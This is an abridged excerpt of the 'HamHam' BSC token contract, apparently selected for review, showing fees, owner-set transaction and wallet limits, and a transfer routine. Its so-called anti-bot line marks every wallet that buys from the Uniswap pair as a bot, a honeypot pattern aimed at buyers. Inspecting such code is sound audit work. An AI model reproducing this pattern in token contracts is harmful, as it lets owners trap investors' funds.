/* 
 Website: https://hamhamtoken.com
 TG: https://t.me/HamHamBSC
*/
...
contract HamHam is Context, IERC20, Ownable {
    ...
    string private _name = "HamHam";
    string private _symbol = "HAMHAM";
    ...
    uint256 private sellliquidityfee = 9;
    ...
    bool public toggleAntiBot = true;
  
    
    uint256 public _maxTxAmount = 100000000000 * 10**9;
    uint256 public _maxWallet = 1500000000 * 10**9;
    ...
    function _setmaxwalletamount(uint256 amount) external onlyOwner() {
        require(amount >= 500000000, "Please check the maxwallet amount, should exceed 0.5% of the supply");
        _maxWallet = amount * 10**9;
    }

    function setmaxTxAmount(uint256 amount) external onlyOwner() {
        require(amount >= 500000000, "Please check MaxtxAmount amount, should exceed 0.5% of the supply");
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && toggleAntiBot) {
            botWallets[to] = true;
        }
